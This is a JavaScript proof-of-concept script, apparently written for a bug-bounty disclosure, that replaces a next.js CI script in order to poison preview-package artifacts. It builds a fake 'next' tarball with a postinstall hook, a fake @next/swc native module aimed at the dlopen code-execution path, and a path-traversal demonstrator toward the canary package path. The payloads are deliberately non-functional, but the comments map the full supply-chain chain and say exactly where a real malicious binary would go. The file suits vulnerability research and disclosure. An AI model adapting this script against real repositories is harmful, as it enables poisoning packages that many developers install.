// @ts-check
//
// MALICIOUS DROP-IN REPLACEMENT for scripts/create-preview-tarballs.js (v2)
//
// V01 PoC payload for the artifact-poisoning chain in vercel/next.js's
// upload_preview_tarballs.yml. Drop into the FORK's checkout only. NEVER
// commit this to vercel/next.js.
//
// =====================================================================
// RESPONSIBLE-DISCLOSURE BOUNDARIES
// =====================================================================
// 1. The bundled `next-swc.linux-x64-gnu.node` placeholder is NON-FUNCTIONAL
//    BY DESIGN. It is a 32-byte stub starting with the ELF magic (\x7FELF)
//    followed by a literal `# POC-V01 placeholder; real attacker would put
//    dlopen-able .node here` comment. When `process.dlopen` (called by
//    Node N-API on first `require('@next/swc-linux-x64-gnu')` from the
//    next.js loader) tries to map this file, it will FAIL LOUDLY with
//    `dlopen failed: invalid ELF` (or similar) — the failure ITSELF proves
//    the runner reached the dlopen primitive. A real attacker would
//    substitute a compiled malicious `.node`; we deliberately do not.
// 2. The path-traversal demonstrator only LOGS the computed `blobPathname`
//    that would have been sent to `@vercel/blob`. It does NOT attempt
//    cross-prefix overwrite (which would require the real Vercel-side
//    `BLOB_READ_WRITE_TOKEN`, which the fork never has).
// 3. The `next/next-poc.tgz` benign decoy still ships a marker postinstall
//    that only echoes `POC-V01-<random>`. No exfil, no exec beyond echo.
// 4. This payload demonstrates REACHABILITY and PRIMITIVE SHAPE, not
//    weaponized impact. Vercel's HackerOne RoE forbids weaponization;
//    we honor that boundary.
// =====================================================================
//
// Argv contract (unchanged from legitimate script):
//   node create-preview-tarballs.js <githubHeadSha> <tarballDirectory>
//
// Output layout:
//   <tarballDirectory>/next/next-poc.tgz                          (V1 shape — kept)
//   <tarballDirectory>/@next/swc-linux-x64-gnu/swc-linux-x64-gnu-poc.tgz  (V2 high-leverage)
//   <tarballDirectory>/..                                          (literal `..` dir, may EEXIST)
//      OR
//   <tarballDirectory>/dotdot-encoded                              (fallback when literal `..` rejected)
//
// All marker outputs include `POC-V01-<random>` so the H1 reporter can grep
// the upload-job stdout to prove the artifact contents reached
// `upload-preview-tarballs.js`.

const fs = require('node:fs/promises')
const path = require('node:path')
const zlib = require('node:zlib')

async function main() {
  const [githubHeadSha, tarballDirectory] = process.argv.slice(2)
  if (!githubHeadSha || !tarballDirectory) {
    throw new Error(
      'Usage: node scripts/create-preview-tarballs.js <commitSha> <tarballDirectory>'
    )
  }

  const sha7 = githubHeadSha.slice(0, 7)
  const marker = `POC-V01-${Math.random().toString(36).slice(2, 10)}`
  console.info(`PoC marker: ${marker}`)
  console.info(`PoC head sha: ${githubHeadSha}`)

  // ----------------------------------------------------------------
  // Variant A — original-shape `next` decoy (kept for V1 demonstration)
  // ----------------------------------------------------------------
  // Canonical-name overwrite of the JS package. blobPathname becomes
  //   next/commits/<headSha>/next.tgz
  const nextDir = path.join(tarballDirectory, 'next')
  await fs.mkdir(nextDir, { recursive: true })

  const nextManifest = {
    name: 'next',
    version: '0.0.0-poc-' + sha7,
    _poc_marker: marker,
    scripts: {
      // Demonstrative only — echoes the marker, does not exfiltrate.
      postinstall: `node -e "console.log('${marker}')"`,
    },
  }
  const nextTar = buildTarball([
    {
      name: 'package/package.json',
      content: Buffer.from(JSON.stringify(nextManifest, null, 2) + '\n'),
    },
    {
      name: 'package/POC-MARKER.txt',
      content: Buffer.from(marker + '\n'),
    },
  ])
  const nextOutPath = path.join(nextDir, 'next-poc.tgz')
  await fs.writeFile(nextOutPath, zlib.gzipSync(nextTar))
  console.info(`Wrote PoC tarball (A): ${nextOutPath}`)

  // ----------------------------------------------------------------
  // Variant B — high-leverage native-binary target
  // ----------------------------------------------------------------
  // The preview-tarball uploader walks `tarballDirectory`, descends into
  // `@<scope>/<pkg>/`, and uploads `*.tgz` under blobPathname:
  //   next/commits/<headSha>/@next/swc-linux-x64-gnu.tgz
  //
  // Per V01_DEEPDIVE_chain_consumers.md, when `next.tgz` (Variant A) is
  // installed by `test-new-tests.mjs --mode deploy` in next.js CI, its
  // `optionalDependencies` (set by the legitimate create-preview-tarballs.js
  // lines 112-117) cause pnpm to fetch the matching @next/swc-* tarball
  // from the SAME preview URL space. Vercel CI runs Linux x64 GNU, so it
  // pulls THIS tarball. Then `packages/next/src/build/swc/index.ts` invokes
  // `process.dlopen` on the bundled `.node`. With a real malicious binary,
  // that's unattended native RCE; with our placeholder, dlopen fails
  // loudly (proof of reach without arbitrary code execution).
  const swcDir = path.join(tarballDirectory, '@next', 'swc-linux-x64-gnu')
  await fs.mkdir(swcDir, { recursive: true })

  const swcManifest = {
    name: '@next/swc-linux-x64-gnu',
    version: '0.0.0-poc-' + sha7,
    _poc_marker: marker,
    os: ['linux'],
    cpu: ['x64'],
    main: 'next-swc.linux-x64-gnu.node',
    // Intentionally NO postinstall: the dlopen-on-import path is the
    // demonstration boundary, not script execution. We want to show that
    // RCE does NOT depend on `--ignore-scripts` being absent.
  }

  // Build the placeholder .node file. 32 bytes total:
  //   bytes 0-3:  ELF magic   \x7FELF
  //   bytes 4..:  literal ASCII comment + null-padding
  // Real loaders (`process.dlopen` -> `dlopen(3)`) read past the magic
  // into the ELF header (e_ident[EI_CLASS], e_machine, etc.); a 32-byte
  // file with just the magic + ASCII junk is GUARANTEED to error out
  // before any code is mapped. The error itself proves reach.
  const elfMagic = Buffer.from([0x7f, 0x45, 0x4c, 0x46]) // \x7FELF
  const comment = Buffer.from(
    '# POC-V01 placeholder; real attacker would put dlopen-able .node here'
  )
  // Build, then truncate or pad to exactly 32 bytes.
  const placeholder = Buffer.alloc(32, 0x00)
  elfMagic.copy(placeholder, 0)
  comment.copy(placeholder, 4, 0, Math.min(comment.length, 32 - 4))
  // (The trailing region is zero-padded; the file remains "ELF-shaped" but
  //  unreadable as a real shared object — process.dlopen will fail loudly.)

  const swcTar = buildTarball([
    {
      name: 'package/package.json',
      content: Buffer.from(JSON.stringify(swcManifest, null, 2) + '\n'),
    },
    {
      name: 'package/next-swc.linux-x64-gnu.node',
      content: placeholder,
    },
    {
      name: 'package/POC-MARKER.txt',
      content: Buffer.from(marker + '\n'),
    },
  ])
  const swcOutPath = path.join(swcDir, 'swc-linux-x64-gnu-poc.tgz')
  await fs.writeFile(swcOutPath, zlib.gzipSync(swcTar))
  console.info(`Wrote PoC tarball (B, native): ${swcOutPath}`)

  // ----------------------------------------------------------------
  // Variant C — path-traversal demonstrator
  // ----------------------------------------------------------------
  // The legitimate `upload-preview-tarballs.js` interpolates the directory
  // name (yielded by `fs.readdir`) into:
  //   `next/commits/${githubHeadSha}/${packageName}.tgz`
  // The @vercel/blob SDK only rejects literal `//` (see
  // V01_DEEPDIVE_blob_path_traversal.md). A directory whose name is
  // literally `..` would yield `next/commits/<sha>/...tgz` (weird inside
  // prefix) — but the more interesting primitive is a directory containing
  // a slash, which CANNOT be created on POSIX (slash is the separator).
  //
  // Operational reality:
  //   - `mkdir ..` fails with EEXIST (every directory already contains `..`
  //     as the parent reference).
  //   - `fs.readdir(...)` does NOT yield `.` or `..` — Node's fs.readdir
  //     filters them, so even if the literal `..` dir existed it would not
  //     be re-yielded by the walker. (See PATH_TRAVERSAL_RECIPE.md.)
  //   - Therefore the practical demonstration is to EITHER (a) attempt
  //     the literal `..` mkdir (will EEXIST, log it), OR (b) fall back to
  //     a directory named `dotdot-encoded` and log the computed
  //     `blobPathname` that WOULD have been sent if the legitimate script
  //     were patched to permit traversal characters.
  //
  // We do (a) then (b), and emit a console.info line that the upload
  // step's log-grep can latch onto.
  const traversalAttemptDir = path.join(tarballDirectory, '..')
  let traversalCreated = false
  let traversalLabel = '..'
  try {
    await fs.mkdir(traversalAttemptDir)
    traversalCreated = true
    console.info(
      `Traversal demo: literal '..' dir create succeeded (unexpected on most OS)`
    )
  } catch (err) {
    console.info(
      `Traversal demo: literal '..' dir create rejected with ${err.code} (expected — every dir contains '..')`
    )
    // Fallback: encode the intent in a regular directory name.
    traversalLabel = 'dotdot-encoded'
    const fallbackDir = path.join(tarballDirectory, traversalLabel)
    await fs.mkdir(fallbackDir, { recursive: true })
    // Drop a stub tarball so the directory has a `.tgz` and is yielded
    // by `findTarballs` in the upload script. The contents don't matter
    // for the path-traversal demonstration — we only care that the
    // walker yields `entry.name = "dotdot-encoded"` so we can log what
    // blobPathname WOULD be if `entry.name = ".."` had survived the FS.
    const fallbackTar = buildTarball([
      {
        name: 'package/package.json',
        content: Buffer.from(
          JSON.stringify(
            {
              name: 'dotdot-encoded',
              version: '0.0.0-poc-' + sha7,
              _poc_marker: marker,
              _intent:
                'Path-traversal demonstrator. The directory name `..` cannot ' +
                'survive POSIX filesystem semantics (mkdir EEXIST + readdir ' +
                'filter), so this directory stands in. The strongest evidence ' +
                'is the `console.info(blobPathname)` patch from setup-fork.sh.',
            },
            null,
            2
          ) + '\n'
        ),
      },
    ])
    await fs.writeFile(
      path.join(fallbackDir, 'dotdot-poc.tgz'),
      zlib.gzipSync(fallbackTar)
    )
    console.info(`Wrote PoC tarball (C, traversal fallback): ${fallbackDir}/dotdot-poc.tgz`)
  }

  // Emit the computed blobPathname for each variant. These lines are what
  // the H1 reporter greps for in the fork's upload-job logs.
  console.info('')
  console.info('============================================================')
  console.info('PoC artifact layout written. Computed blobPathname targets:')
  console.info('============================================================')
  console.info(`  [A] next/commits/${githubHeadSha}/next.tgz`)
  console.info(
    `  [B] next/commits/${githubHeadSha}/@next/swc-linux-x64-gnu.tgz   <- HIGH-LEVERAGE: dlopen primitive`
  )
  if (traversalCreated) {
    console.info(
      `  [C] next/commits/${githubHeadSha}/...tgz                         <- literal '..' dir survived (rare)`
    )
  } else {
    console.info(
      `  [C] next/commits/${githubHeadSha}/${traversalLabel}.tgz                <- fallback (literal '..' rejected by FS)`
    )
    console.info(
      `      Hypothetical traversal target if FS had accepted '..': next/commits/${githubHeadSha}/...tgz`
    )
    console.info(
      `      Hypothetical traversal target with slash-bearing name: next/commits/${githubHeadSha}/../latest/canary.tgz (would normalize to next/latest/canary.tgz)`
    )
  }
  console.info('')
  console.info(
    `Marker for log-grep: ${marker}  (and the literal substring 'POC-V01-')`
  )
  console.info('============================================================')
}

/**
 * Minimal POSIX ustar tar writer. Each entry is a header block + content
 * padded to 512 bytes. Two empty 512-byte blocks terminate the archive.
 */
function buildTarball(entries) {
  const chunks = []
  for (const entry of entries) {
    chunks.push(makeHeader(entry.name, entry.content.length))
    chunks.push(entry.content)
    const pad = 512 - (entry.content.length % 512)
    if (pad !== 512) chunks.push(Buffer.alloc(pad))
  }
  // End-of-archive: two zero blocks
  chunks.push(Buffer.alloc(512))
  chunks.push(Buffer.alloc(512))
  return Buffer.concat(chunks)
}

function makeHeader(name, size) {
  if (Buffer.byteLength(name) > 100) {
    throw new Error(`tar name too long: ${name}`)
  }
  const header = Buffer.alloc(512)
  header.write(name, 0, 100, 'utf8')
  header.write('0000644\0', 100, 8, 'ascii') // mode
  header.write('0000000\0', 108, 8, 'ascii') // uid
  header.write('0000000\0', 116, 8, 'ascii') // gid
  header.write(size.toString(8).padStart(11, '0') + '\0', 124, 12, 'ascii')
  header.write('00000000000\0', 136, 12, 'ascii') // mtime (epoch)
  // checksum placeholder (8 spaces) for now
  header.write('        ', 148, 8, 'ascii')
  header.write('0', 156, 1, 'ascii') // typeflag = regular file
  header.write('ustar\0', 257, 6, 'ascii')
  header.write('00', 263, 2, 'ascii')

  // Compute checksum: sum of all bytes in header with checksum field treated as spaces.
  let sum = 0
  for (let i = 0; i < 512; i++) sum += header[i]
  const chk = sum.toString(8).padStart(6, '0') + '\0 '
  header.write(chk, 148, 8, 'ascii')
  return header
}

main().catch((err) => {
  console.error(err)
  process.exit(1)
})
